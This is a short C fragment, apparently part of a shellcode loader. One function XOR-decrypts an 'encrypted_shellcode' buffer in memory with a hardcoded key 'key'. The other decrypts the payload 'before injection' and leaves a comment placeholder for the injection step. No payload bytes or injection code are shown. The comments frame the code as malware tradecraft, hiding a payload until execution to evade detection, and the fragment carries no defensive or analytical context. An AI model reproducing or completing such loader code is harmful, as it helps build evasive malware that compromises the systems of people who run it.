// decrypt the payload in memory at the moment of execution
void decrypt_payload(unsigned char *data, size_t data_len, char *key, size_t key_len)
{
    for (size_t i = 0; i < data_len; i++)
    {
        data[i] = data[i] ^ key[i % key_len];
    }
}

// example function for preparing the execution flow
void prepare_and_run(unsigned char *encrypted_shellcode, size_t size)
{
    char key[] = "key";

    // perform decryption directly in memory before injection
    decrypt_payload(encrypted_shellcode, size, key, sizeof(key) - 1);

    // call the injection logic once the payload is clear
}
